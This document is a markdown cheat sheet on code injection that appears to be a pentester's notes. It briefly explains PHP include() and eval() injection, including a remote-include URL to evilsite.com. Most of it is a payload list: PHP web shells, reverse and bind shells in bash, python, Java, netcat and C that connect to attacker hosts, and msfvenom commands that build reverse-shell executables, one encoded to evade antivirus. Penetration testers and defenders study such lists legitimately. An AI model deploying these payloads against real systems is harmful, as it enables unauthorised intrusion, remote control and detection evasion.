# What is Code Injection?
   Code Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. This type of attack 
   exploits poor handling of untrusted data. These types of attacks are usually made possible due to a lack of proper input/output data validation. Code Injection 
   differs from Command Injection in that an attacker is only limited by the functionality of the injected language itself. If an attacker is able to inject PHP 
   code into an application and have it executed, they are only limited by what PHP is capable of. Code Injection occurs when an application evaluates code without 
   validating it first.

# Code Injection

## Example
   Suppose f an application passes a parameter sent via a GET request to the PHP ## include() function with no input validation, the attacker may try to 
   execute code other than what the developer had in mind.
          
### The URL below passes a page name to the include() function.
   http://testsite.com/index.php?page=contact.php
                
   The file **info.php** may contain, for example, the phpinfo() function which is useful for gaining information about the configuration of the environment
   in which the web service runs. An attacker can ask the application to execute their PHP code using the following request:
          
   http://testsite.com/?page=http://evilsite.com/evilcode.php

## Example 
    
   When a developer uses the PHP ##eval() function and passes it untrusted data that an attacker can modify, code injection could be possible.
   The below shows a dangerous way to use the eval() function
            
   ' $myvar = "varname";
     $x = $_GET['arg'];
     eval("$myvar = $x;"); '
                
   As there is no input validation, the code above is vulnerable to a Code Injection
            
# Payload For Code Injection
     php: 
     # Execute one command
         <?php system("whoami"); ?>
          <?php echo shell_exec("nc.exe -nlvp 4444 -C:\Windows\System32\cmd.exe");?>
    
    # Take input from the url paramter. shell.php?cmd=whoami
        <?php system($_GET['cmd']); ?>
        <?php echo shell_exec($_GET["cmd"]); ?>
        <? passthru($_GET["cmd"]); ?>
        php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
        <?php $c=$_GET[‘c’]; echo `$c`; ?>
    
    # The same but using passthru
        <?php passthru($_GET['cmd']); ?>
    
    # For shell_exec to output the result you need to echo it
        <?php echo shell_exec("whoami");?>
    
    # preg_replace(). This is a cool trick
        <?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
    
    # Using backticks
        <?php $output = `whoami`; echo "<pre>$output</pre>"; ?>
    # Using backticks
        <?php echo `whoami`; ?>
    
    # upload nc.php
        <?php echo system("nc -lvp 81 -e cmd.exe");?>
        # upload nc.exe
        # run nc.php on browser
        --------------------------------------------------------------------
    # Bash:
        0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196
        bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
        bash -i >& /dev/tcp/<your ip>/<your port> 0>&1
        nc -nlvp 443
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> <your port> >/tmp/f
        --------------------------------------------------------------------
    # python:
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
        import socket,subprocess,os;
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
        s.connect(("10.0.0.1",1234));
        os.dup2(s.fileno(),0); 
        os.dup2(s.fileno(),1); 
        os.dup2(s.fileno(),2);
        p=subprocess.call(["/bin/sh","-i"]);
        --------------------------------------------------------------------
    # Java:
        r = Runtime.getRuntime()
        p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
        p.waitFor()
        --------------------------------------------------------------------netcat:
    # netcat bind shell
        nc -vlp 5555 -e /bin/bash
        nc 192.168.1.101 5555
        # netcat reverse shell
        nc -lvp 5555
        nc 192.168.1.101 5555 -e /bin/bash
        # With -e flag
        nc -e /bin/sh <your ip> <your port>
        # Without -e flag
        rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
        --------------------------------------------------------------------C
    # include <stdlib.h>
        int main () {
        system("nc.exe -e cmd.exe <myip> <myport>");
        return 0;
        }
        ----------------------------------------- 
        Msfvenom: 
        msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f exe -o shell_reverse.exe
        --------------------------------------------------------------------to avoid AV detection, use encryption:
        msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
        --------------------------------------------------------------------php:
        msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip> LPORT=<your port> -f raw > shell.php
        --------------------------------------------------------------------
        asp: 
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=<your port> -f asp > shell.asp
        --------------------------------------------------------------------war:
        msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f war > shell.war
        --------------------------------------------------------------------JSP:
        msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f raw > shell.jsp
        --------------------------------------------------------------------binary:
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf
        --------------------------------------------------------------------List linux meterpreter payloads:
        msfvenom --list | grep xxxx
        --------------------------------------------------------------------Send linux shell to meterpreter:
        msfvenom -p linux/x64/meterpreter/reverse_tcp lhost= lport= -f elf -o msf.bin (set multi handler then)
        ------------------------------------------------------------ '
 
 # References:
   - [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
   - [ Cobalt Code Injection](https://cobalt.io/blog/a-pentesters-guide-to-code-injection)
